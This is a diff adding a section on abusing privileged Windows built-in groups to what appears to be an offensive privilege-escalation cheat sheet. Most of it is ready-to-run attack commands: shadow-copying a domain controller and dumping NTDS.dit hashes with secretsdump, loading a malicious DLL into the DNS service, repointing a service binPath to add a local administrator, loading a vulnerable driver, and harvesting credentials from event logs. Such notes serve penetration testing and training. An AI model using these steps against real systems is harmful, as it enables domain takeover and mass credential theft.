@@ -71,6 +71,28 @@ Service accounts (IIS `iis apppool\...`, MSSQL via `xp_cmdshell`) almost always 
 
 > These map one-to-one: SeImpersonate→potato, SeDebug→LSASS, SeBackup→NTDS/SAM, SeTakeOwnership→read-any-file. Reading `whoami /priv` tells you which path is open before you try anything.
 
+## Privileged built-in group abuse
+Membership in these groups (check `whoami /groups`) = a privesc path, even without being a full admin:
+
+| Group | Abuse → outcome |
+|---|---|
+| **Backup Operators** (SeBackup/SeRestore) | shadow-copy the DC volume with `diskshadow`, copy **NTDS.dit** + `reg save HKLM\SYSTEM`, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL` → all domain hashes |
+| **DnsAdmins** | load a malicious `ServerLevelPluginDll` into the DNS service (runs as SYSTEM on the DC): `dnscmd /config /serverlevelplugindll <dll>` → `sc stop dns; sc start dns`. (DLL built with msfvenom; mimilib source not stored.) Also WPAD spoofing via `Add-DnsServerResourceRecordA wpad`. |
+| **Server Operators** | `SERVICE_ALL_ACCESS` on services → repoint a service binPath: `sc config <svc> binPath= "cmd /c net localgroup Administrators <me> /add"` → `sc start <svc>` → local admin |
+| **Print Operators** (SeLoadDriver) | load a vulnerable signed driver (BYOVD, e.g. Capcom.sys) via registry → exploit it for SYSTEM. Needs the priv enabled (UAC bypass). |
+| **Hyper-V Administrators** | clone a virtualized DC, mount its VHDX offline, extract NTDS.dit; or old hard-link service-replace (patched Mar 2020) |
+| **Event Log Readers** | read the Security log for creds in process-creation (Event ID 4688) command lines: `wevtutil qe Security /f:text | findstr "/user"` or `Get-WinEvent -LogName security | ? {$_.ID -eq 4688}` |
+
+**Backup Operators NTDS steps (the common one):**
+```text
+diskshadow.exe   # script: set context persistent; begin backup; add volume C: alias x; create; expose %x% E:; end backup
+robocopy /B E:\Windows\NTDS\ . ntds.dit
+reg save HKLM\SYSTEM SYSTEM.SAV
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
+```
+
+> Always run `whoami /groups`. These "weak" admin-adjacent groups (Backup Operators, DnsAdmins, Server Operators) are frequently handed out and each is a clean path to DA/SYSTEM — defenders forget they're nearly as powerful as Domain Admins.
+
 ## Credential dumping
 ```text
 # LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
